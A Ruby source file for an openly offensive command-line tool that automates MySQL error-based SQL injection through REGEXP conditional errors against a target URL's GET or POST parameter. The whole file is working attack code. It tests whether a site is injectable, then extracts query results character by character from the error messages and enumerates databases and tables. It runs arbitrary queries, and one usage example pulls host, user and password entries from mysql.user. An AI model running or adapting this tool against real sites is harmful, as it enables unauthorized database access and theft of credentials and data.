#!/usr/bin/env ruby
#
# MySQL Regexp Conditional Error Based Injection
# By: Hood3dRob1n
#
# Is it Blind or is it Error Based? IDK, you decide!
# I didn't invent this, just automated it a bit :)
# It is much faster than standard boolean method, see pics
# http://i.imgur.com/qu90iBr.png
# http://i.imgur.com/0Htnqb4.png
#
# Enjoy Responsible :)
#

### PROXY SETTINGS ####
$proxy=true          #
$proxyip='127.0.0.1'  #
$proxyport=8080       #
$proxy_auth=false     #
$proxy_user=''        #
$proxy_pass=''        #
#######################

###### HTTP REQUEST #####
$ref=false              #
$referrer=''            #
$user_agent=nil         #
$cookiefile=''          #
$headers_add=false      #
$cookie_support=false   #
$headers={'Foo'=>'Bar'} #
#########################

### HTTP AUTH ###
$auth=false     #
$auth_user=''   #
$auth_pass=''   #
#################

require 'cgi'
require 'optparse'
require 'colorize'
require 'curb'

# Trap Interupts
trap("SIGINT") {puts "\n\nWARNING! CTRL+C Detected, Shutting things down....."; exit 666;}

# 31337 Banner
def banner
  puts
  puts "MySQL Regexp Conditional Error Based Injection"
  puts "By: Hood3dRob1n"
end

# Clear Terminal
def cls
  if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
    system('cls')
  else
    system('clear')
  end
end

# Find the parameters in URL provided
# Returns a Hash{ 'param' => 'value' } or nil if no params found
def find_parameters(paramaterstring)
  parameters={}
  if not paramaterstring =~ /.+=/
    return nil
  else
    if paramaterstring =~ /.+=.+&.+/
      foo = paramaterstring.split('&')
      foo.each do |paramz|
        parameters.store(paramz.split('=')[0], paramz.split('=')[1])
      end
      return parameters
    elsif paramaterstring =~ /.+=.+;.+/
      foo = paramaterstring.split(';')
      foo.each do |paramz|
        parameters.store(paramz.split('=')[0], paramz.split('=')[1])
      end
      return parameters
    else
      k = paramaterstring.split('=')[0]
      v = paramaterstring.split('=')[1]
      parameters.store(k, v)
      return parameters
    end
  end
end

# Add URL-Encoding to String Class
class String
  # URI Encode String
  def urienc encoding=nil
    begin
      CGI::escape self
    rescue ArgumentError => e
      if e.to_s == 'invalid byte sequence in UTF-8'
        encoding = 'binary' if encoding.nil?
        CGI::escape self.force_encoding(encoding)
      else
        raise e
      end
    end
  end

  # Convert String to HEX Value with '0x' prefix for mysql friendliness
  def mysqlhex
    foo='0x'
    foo += self.each_byte.map { |b| b.to_s(16) }.join
    return foo
  end

  # HEX Decoding of mysql hex '0x'
  def mysqlhexdecode
    self.sub('0x','').scan(/../).map { |x| x.hex.chr }.join
  end
end

# Curb Wrapper Class for HTTP Request Handling
# Makes it a touch easier
class EasyCurb
  # Curl::Multi Request Option
  # Returns a Hash { 'url link' => [single response array] }
  def multi_get(arrayoflinks)
    mresponses = {}
    m = Curl::Multi.new
    # add a few easy handles
    arrayoflinks.each do |url|
      mresponses[url] = simple(url)
      m.add(mresponses[url])
    end
    begin
      m.perform
    rescue Curl::Err::ConnectionFailedError => e
	puts "Redo - Problem with Network Connection => #{e}"
    rescue Curl::Err::MalformedURLError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::PartialFileError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::GotNothingError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::RecvError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::HostResolutionError => e
	puts "Problem resolving Host Details => #{e}"
    end
    # Return our Hash with URL as Key and Simple Response Array for Value
    return mresponses
  end

  def simple(link, postdata=nil)
    agents = ['Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
  'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
  'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1',
  'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
  'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
  'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
  'Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)',
  'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00' ]

    @ch = Curl::Easy.new(link) do |curl|
      # Set Proxy Connection Details if needed
      if $proxy
        curl.proxy_url = $proxyip
        curl.proxy_port = $proxyport.to_i
        if $proxy_auth
          curl.proxypwd = "#{$proxy_user}:#{$proxy_pass}"
        end
      end

      # Set HTTP Authentication Details if needed
      if $auth
        curl.http_auth_types = :basic
        curl.username = $auth_user
        curl.password = $auth_pass
      end

      # Add custom referrer if needed
      if $ref
        curl.headers['Referer'] = "#{$referrer}"
      end

      # Add custom headers as needed
      if $headers_add
        $headers.each do |k, v|
          curl.headers["#{k}"] = "#{v}"
        end
      end

      # Add custom cookies if needed
      if $cookie_support
        curl.cookies = $cookiefile
      end

      # Set User-Agent to default or whatever was selected
      if $user_agent.nil?
        $user_agent = agents[rand(agents.size)]
      end
      curl.useragent = $user_agent

      # Setup Post Request If needed
      begin
        curl.http_post(link, "#{postdata}") if not postdata.nil?
      rescue Curl::Err::ConnectionFailedError => e
        puts "Redo - Problem with Network Connection => #{e}"
      rescue Curl::Err::MalformedURLError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::PartialFileError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::RecvError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::GotNothingError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::HostResolutionError => e
        puts "Problem resolving Host Details => #{e}"
      end
    end
  end

  # Make GET requests to given link
  # Returns an array filled with the following: 
  # response_body, response_code, repsonse_time, response_headers
  def get(getlink)
    simple(getlink)
    begin
      @ch.perform
    rescue Curl::Err::ConnectionFailedError => e
      puts "Redo - Problem with Network Connection => #{e}"
    rescue Curl::Err::MalformedURLError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::PartialFileError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::RecvError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::GotNothingError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::HostResolutionError => e
      puts "Problem resolving Host Details => #{e}"
    end
    return @ch.body_str, @ch.response_code, @ch.total_time, @ch.header_str
  end

  # Make POST requests to given link and post data
  # Returns an array filled with the following: 
  # response_body, response_code, repsonse_time, response_headers
  def post(postlink, postdata)
    simple(postlink, postdata)
    return @ch.body_str, @ch.response_code, @ch.total_time, @ch.header_str
  end
end

# Confirm URL & Injection Marker are working and site is vuln
# Returns True or False
def regexp_vuln_test(link, postdata=nil)
  sqli_true = "#{@prefix}aNd 1=(SELECT 1 REGEXP IF(1=1,1,''))#{@suffix}".urienc
  sqli_false = "#{@prefix}aNd 1=(SELECT 1 REGEXP IF(1=2,1,''))#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      t = link.sub('[INJECTME]', sqli_true)
      f = link.sub('[INJECTME]', sqli_false)
    else
      t = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
      f = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_false}")
    end
    trez = @http.get(t)
    frez = @http.get(f)
  else
    # POST
    if @paramk == '[INJECTME]'
      t = postdata.sub('[INJECTME]', sqli_true)
      f = postdata.sub('[INJECTME]', sqli_false)
    else
      t = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
      f = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_false}")
    end
    trez = @http.post(link, t)
    frez = @http.post(link, f)
  end
  if trez[0] == frez[0]
    return false
  elsif frez[0] =~ /empty \(sub\)expression/ and not trez[0] =~ /empty \(sub\)expression/
    return true
  else
    return false
  end
end

# We need to check if data exists before spinning our wheels
# If there is data, the length will be greater than 0
# Return True if data, False if not
def data_exists(link, postdata=nil, query)
  inj = "#{@prefix}and 1=(SELECT 1 REGEXP IF((select length( (#{query}) )>0),1,''))#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      sqli = link.sub('[INJECTME]', inj)
    else
      sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.get(sqli)
  else
    # POST
    if @paramk == '[INJECTME]'
      sqli = postdata.sub('[INJECTME]', inj)
    else
      sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.post(link, sqli)
  end
  if rez[0] =~ /empty \(sub\)expression/
    return false
  else
    return true
  end
end

# Find Length of Query & Dump Results
# Run data_exists?(query) first!
# Returns Results or nil
def sql_inject(link, postdata=nil, query)
  if not data_exists(link, postdata, query)
    puts
    puts "Doesn't appear any data exists!"
    puts "Might be privleges or value is NULL, idk...."
    puts "Double check manually to be 100% sure...."
    puts
    return nil
  end
  zcount=10
  while(true)
    inj = "#{@prefix}and 1=(SELECT 1 REGEXP IF((select length( (#{query}) )<#{zcount}),1,''))#{@suffix}".urienc

    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}" + inj)
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}" + inj)
      end
      rez = @http.post(link, sqli)
    end
    if not rez[0] =~ /empty \(sub\)expression/
      if zcount.to_i <= 10
        starts = 0
      elsif zcount.to_i > 10 and zcount.to_i < 100
        starts = (zcount.to_i - 10)
      elsif zcount.to_i > 100 and zcount.to_i < 1000
        starts = (zcount.to_i - 50)
      elsif zcount.to_i > 1000 and zcount.to_i < 100000
        starts = (zcount.to_i - 100)
      end
      ends = zcount.to_i
      break
    else
      if zcount.to_i < 100
        zcount = zcount.to_i + 10
      elsif zcount.to_i > 100 and zcount.to_i < 1000
        zcount = zcount.to_i + 50
      elsif zcount.to_i > 1000 and zcount.to_i < 1000000
        zcount = zcount.to_i + 100
      end
      if zcount.to_i > 1000000
        puts "Length > 1000000!"
        puts "Too much to extract blind!"
        return nil
      end
    end
  end

  reallength=0
  baselength=starts.to_i
  while baselength.to_i < 1000000
    inj = "#{@prefix}aNd 1=(SELECT 1 REGEXP "
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i},'',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 1},'(',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 2},'[',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 3},'\\\\\\\\',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 4},'*',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 5},'a{1,1,1}',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 6},'[a-9]',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 7},'a{1',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 8},'[[.ab.]]',"
    inj += "IF((SELECT length((#{query})))=#{baselength.to_i + 9},'[[:ab:]]',1)))))))))))#{@suffix}"

    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj.urienc)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}" + inj.urienc)
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj.urienc)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}" + inj.urienc)
      end
      rez = @http.post(link, sqli)
    end

    if rez[0] =~ /empty \(sub\)expression/
      reallength = baselength.to_i
      break
    elsif rez[0] =~ /parentheses not balanced/
      reallength = baselength.to_i + 1
      break
    elsif rez[0] =~ /brackets \(\[ \]\) not balanced/
      reallength = baselength.to_i + 2
      break
    elsif rez[0] =~ /trailing backslash \(\\\)/
      reallength = baselength.to_i + 3
      break
    elsif rez[0] =~ /repetition-operator operand invalid/
      reallength = baselength.to_i + 4
      break
    elsif rez[0] =~ /invalid repetition count\(s\)/
      reallength = baselength.to_i + 5
      break
    elsif rez[0] =~ /invalid character range/
      reallength = baselength.to_i + 6
      break
    elsif rez[0] =~ /braces not balanced/
      reallength = baselength.to_i + 7
      break
    elsif rez[0] =~ /invalid collating element/
      reallength = baselength.to_i + 8
      break
    elsif rez[0] =~ /invalid character class/
      reallength = baselength.to_i + 9
      break
    end
    baselength = baselength.to_i + 10
  end

#puts "Real: #{reallength}".light_green
#puts "Base: #{baselength}".light_green

  # Now we go get the actual result!using length
  char_position = 1
  results = ''
  while char_position.to_i < (reallength.to_i + 1)
    # Determine ascii range of target char
    inj = "#{@prefix}aNd 1=(SELECT 1 REGEXP "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<31,'', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<52,'(', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<73,'[', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<94,'\\\\\\\\',"
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<115,'*', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<136,'a{1,1,1}', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<157,'[a-9]', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<178,'a{1', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<199,'[[.ab.]]', "
    inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))<230,'[[:ab:]]',1)))))))))))#{@suffix}"

    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj.urienc)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj.urienc}")
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj.urienc)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj.urienc}")
      end
      rez = @http.post(link, sqli)
    end

    if rez[0] =~ /empty \(sub\)expression/
      starts=0
      ends=30
    elsif rez[0] =~ /parentheses not balanced/
      starts=31
      ends=51
    elsif rez[0] =~ /brackets \(\[ \]\) not balanced/
      starts=52
      ends=72
    elsif rez[0] =~ /trailing backslash \(\\\)/
      starts=73
      ends=93
    elsif rez[0] =~ /repetition-operator operand invalid/
      starts=94
      ends=114
    elsif rez[0] =~ /invalid repetition count\(s\)/
      starts=115
      ends=135
    elsif rez[0] =~ /invalid character range/
      starts=136
      ends=156
    elsif rez[0] =~ /braces not balanced/
      starts=157
      ends=177
    elsif rez[0] =~ /invalid collating element/
      starts=178
      ends=198
    elsif rez[0] =~ /invalid character class/
      starts=199
      ends=229
    elsif rez[0] == @true
      starts=230
      ends=255
    end

#puts "Starts: #{starts}".light_yellow
#puts "Ends: #{ends}".light_yellow

    char=''
    redo_count=1
    ticker=starts.to_i
    while(true)
      # Determine actual ascii value for target char
      # Thi should take no more than 4 requests :)
      inj = "#{@prefix}aNd 1=(SELECT 1 REGEXP "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker},'', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 1},'(', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 2},'[', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 3},'\\\\\\\\',"
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 4},'*', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 5},'a{1,1,1}', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 6},'[a-9]', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 7},'a{1', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 8},'[[.ab.]]', "
      inj += "IF(ASCII(SUBSTRING((#{query}),#{char_position},1))=#{ticker + 9},'[[:ab:]]',1)))))))))))#{@suffix}"

      if postdata.nil? or postdata == ''
        # GET
        if @paramk == '[INJECTME]'
          sqli = link.sub('[INJECTME]', inj.urienc)
        else
          sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj.urienc}")
        end
        rez = @http.get(sqli)
      else
        # POST
        if @paramk == '[INJECTME]'
          sqli = postdata.sub('[INJECTME]', inj.urienc)
        else
          sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj.urienc}")
        end
        rez = @http.post(link, sqli)
      end

      if rez[0] =~ /empty \(sub\)expression/
        char = ticker.to_i
        break
      elsif rez[0] =~ /parentheses not balanced/
        char = (ticker.to_i + 1)
        break
      elsif rez[0] =~ /brackets \(\[ \]\) not balanced/
        char = (ticker.to_i + 2)
        break
      elsif rez[0] =~ /trailing backslash \(\\\)/
        char = (ticker.to_i + 3)
        break
      elsif rez[0] =~ /repetition-operator operand invalid/
        char = (ticker.to_i + 4)
        break
      elsif rez[0] =~ /invalid repetition count\(s\)/
        char = (ticker.to_i + 5)
        break
      elsif rez[0] =~ /invalid character range/
        char = (ticker.to_i + 6)
        break
      elsif rez[0] =~ /braces not balanced/
        char = (ticker.to_i + 7)
        break
      elsif rez[0] =~ /invalid collating element/
        char = (ticker.to_i + 8)
        break
      elsif rez[0] =~ /invalid character class/
        char = (ticker.to_i + 9)
        break
      end
      if ticker.to_i > 260
        ticker = 0 # Fall Back and Startover, something went wrong
      else
        ticker = ticker.to_i + 10
      end
    end

#puts "Ticker: #{ticker}".light_red
#puts "Position: #{char_position}".light_red
#puts "Char: #{char.chr}".light_red

    if char.nil? or char == ''
      print "\r#{results}".cyan + "?".white
    else
      print "\r#{results}#{char.chr}".cyan
      results += char.chr
    end
    char_position = char_position.to_i + 1
  end
  puts "\n"
  if results.nil? or results == ''
    return nil
  else
    return results
  end
end



# Main --
options = {}
optparse = OptionParser.new do |opts| 
  opts.banner = "Usage: #{$0} [OPTIONS]"
  opts.separator ""
  opts.separator "EX: #{$0} -u 'http://somesite.com/index.php?foo=vuln&bar=666' -p foo -b --dbs"
  opts.separator "EX: #{$0} -u http://192.168.2.43/sqli-labs/Less-5/index.php?id=1 -p id -s \"' \" -e '-- -' -b --dbs --tables"
  opts.separator "EX: #{$0} -u \"http://192.168.2.43/sqli-labs/Less-8/index.php?id=1')[INJECTME]\" -q \"SELECT concat(host,0x3a,user,0x3a,password) FROM mysql.user where file_priv='Y' limit 1,1\""
  opts.separator ""
  opts.separator "Options: "
  opts.on('-u', '--url URL', "\n\tURL to Inject") do |target|
    options[:target] = target.chomp
  end
  opts.on('-d', '--data DATA', "\n\tPost Request Data") do |data|
    options[:post] = data.chomp
  end
  opts.on('-p', '--parameter PAR', "\n\tVulnerable Parameter to Inject") do |param|
    options[:param] = param.chomp
  end
  opts.on('-s', '--start STRING', "\n\tInjection Prefix to Use (i.e. ' ,') ,\") ,etc) ") do |param|
    options[:start] = param.chomp
  end
  opts.on('-e', '--end STRING', "\n\tInjection Ending or Delimeter to Use (i.e. --, #, -- -, /*, etc)") do |param|
    options[:end] = param.chomp
  end
  opts.on('-b', '--basic', "\n\tEnumerate Basic Information") do |basic|
    options[:basic] = true
  end
  opts.on('-y', '--dbs', "\n\tEnumerate Available Databases") do |dbs|
    options[:dbs] = true
  end
  opts.on('-t', '--tables', "\n\tEnumerate Tables from Current Databases") do |tbl|
    options[:tables] = true
  end
  opts.on('-q', '--query SQL', "\n\tSQL Query to Run") do |param|
    options[:query] = param.chomp
  end
  opts.on('-h', '--help', "\n\tHelp Menu") do 
    cls
    banner
    puts
    puts opts
    puts
    exit 69;
  end
end
begin
  foo = ARGV[0] || ARGV[0] = "-h"
  optparse.parse!
  if options[:param].nil?
    if options[:target] =~ /\[INJECTME\]/i
      options[:param] = '[INJECTME]'
    end
  end
  mandatory = [:target,:param]
  missing = mandatory.select{ |param| options[param].nil? }
  if not missing.empty?
    cls
    banner
    puts
    puts "Missing options: #{missing.join(', ')}"
    puts optparse
    exit 666;
  end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
  cls
  banner
  puts
  puts $!.to_s
  puts
  puts optparse
  puts
  exit 666;   
end

# Identify Parameter or Injection Marker
# Helps with injection placements later
if options[:param] == '[INJECTME]'
  @paramk = options[:param]
  @paramv = 'foofucked'
else
  if options[:post].nil?
    paramaters = find_parameters(URI.parse(options[:target]).query)
  else
    paramaters = find_parameters(options[:post])
  end
  begin
    paramaters.each do |key, value|
      if options[:param] == key
        @paramk = options[:param]
        @paramv = value
      end
    end
  rescue
    puts "No Parameters Matched or Injection Marker Not Found!"
  end
end

# String Based Injections
# or Breakouts add as prefix
if options[:start].nil?
  @prefix = ' '
else
  @prefix = options[:start]
end

# This is our query delimeter
if options[:end].nil?
  @suffix = '-- -'
else
  @suffix = options[:end]
end

# Create a re-usable handle for http requests
@http=EasyCurb.new

# Now we go inject stuff :)
if regexp_vuln_test(options[:target], options[:post])
  puts "Appers to be vuln, starting injection now".light_green  + ".....".white
  # Enumerate basic info
  if options[:basic]
    version = sql_inject(options[:target], options[:post], 'SELECT VERSION()')
    user = sql_inject(options[:target], options[:post], 'SELECT USER()')
    db = sql_inject(options[:target], options[:post], 'SELECT DATABASE()')

    puts "Basic Info".light_green + ": ".white
    puts "Version".light_green + ": #{version}".white unless version.nil?
    puts "User".light_green + ": #{user}".white unless user.nil?
    puts "DB".light_green + ": #{db}".white unless db.nil?
  end

  # Enumerate Available Databases
  if options[:dbs]
    v = sql_inject(options[:target], options[:post], 'MID((SELECT VERSION()),1,1)')
    if v.to_i >= 5
      dbz=[]
      dbs_count = sql_inject(options[:target], options[:post], 'SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA')
      puts "Fetching ".light_green + "#{dbs_count}".white + " Databases".light_green + "....".white unless dbs_count.nil?
      if dbs_count.to_i > 0
        0.upto(dbs_count.to_i - 1).each do |zcount|
          results = sql_inject(options[:target], options[:post], "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{zcount},1")
          pad = ' ' * (results.size + 25) unless results.nil? or results == ''
          pad = ' ' * 50 if results.nil? or results == ''
          print "\r(#{zcount})> #{results}#{pad}".cyan unless results == ''
          dbz << results unless results == ''
        end
        puts "\n"
        if dbz.empty?
          puts
          puts "Unable to get any database names!"
          puts "Lack of privileges?"
          puts "Possible Solutions include:"
          puts "A) Become HR's best friend by updating the code and sending him a copy"
          puts "B) Tweak Settings and try things again"
          puts "C) Be a bawz and do it manually"
          puts
        else	
          puts "DBS".light_green + ": #{dbz.join(', ').sub(/, $/, '')}".white
        end
      else
        puts "Unable to determine number of available database, sorry".light_red + "....".white
      end
    else
      puts "MySQL Version < 5 - No Information Schema Available".light_red + "!".white
    end 
  end

  # Get Tables from Current DB
  if options[:tables]
    v = sql_inject(options[:target], options[:post], 'MID((SELECT VERSION()),1,1)')
    if v.to_i >= 5
      tables=[]
      tbl_count = sql_inject(options[:target], options[:post], 'SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()')
      if tbl_count.to_i > 0
        puts "Fetching ".light_green + "#{tbl_count}".white + " Tables from Current DB".light_green unless tbl_count.nil?
        0.upto(tbl_count.to_i - 1).each do |zcount|
          results = sql_inject(options[:target], options[:post], "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT #{zcount},1")
          tables << results unless results == ''
        end
        puts "\n"
        if dbz.empty?
          puts
          puts "Unable to get any tables from current db!"
          puts "Lack of privileges?"
          puts "Possible Solutions include:"
          puts "A) Become HR's best friend by updating the code and sending him a copy"
          puts "B) Tweak Settings and try things again"
          puts "C) Be a bawz and do it manually"
          puts
        else	
          puts "Tables".light_green + ": #{tables.join(', ').sub(/, $/, '')}".white
        end
      else
        puts "Unable to determine number of tables in current database, sorry".light_red + "....".white
      end
    else
      puts "MySQL Version < 5 - No Information Schema Available".light_red + "!".white
    end 
  end

  # Run Custom Embedded SQL Query
  if not options[:query].nil?
    results = sql_inject(options[:target], options[:post], options[:query])
    if not results.nil?
      puts "SQL".light_green + ": #{options[:query]}".white
      puts "Result".light_green + ": #{results}".white
    end
  end
else
  puts
  puts "Link doesn't appear to be injectable through MySQL Conditional Errors!"
  puts "Sorry, double check manually to be sure...."
  puts
end
#EOF
